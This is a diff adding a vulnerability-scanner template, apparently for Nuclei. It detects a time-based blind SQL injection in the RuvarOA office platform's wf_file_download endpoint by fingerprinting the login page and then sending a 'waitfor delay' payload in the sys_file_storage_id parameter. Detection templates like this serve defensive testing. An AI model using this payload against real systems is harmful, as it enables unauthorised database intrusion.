@@ -1,0 +1,50 @@
+id: ruvaroa-wf-file-download-sqli
+info:
+  name: RuvarOA wf_file_download SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    This template detects an SQL Injection vulnerability in the RuvarOA wf_file_download endpoint.
+    It leverages a time-based blind SQL injection payload to confirm the presence of the issue.
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 2}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: step-1
+    name: Check platform fingerprint
+    method: GET
+    path:
+      - "{{BaseURL}}/login.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "RuvarOA协同办公平台"
+
+  - id: step-2
+    name: Check for time-based SQL Injection
+    method: GET
+    path:
+      - "{{BaseURL}}/Mobile/WorkFlow/wf_file_download.aspx?attach_type=1&sys_file_storage_id=1+waitfor+delay+'0:0:{{t1}}'+--+"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ""
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
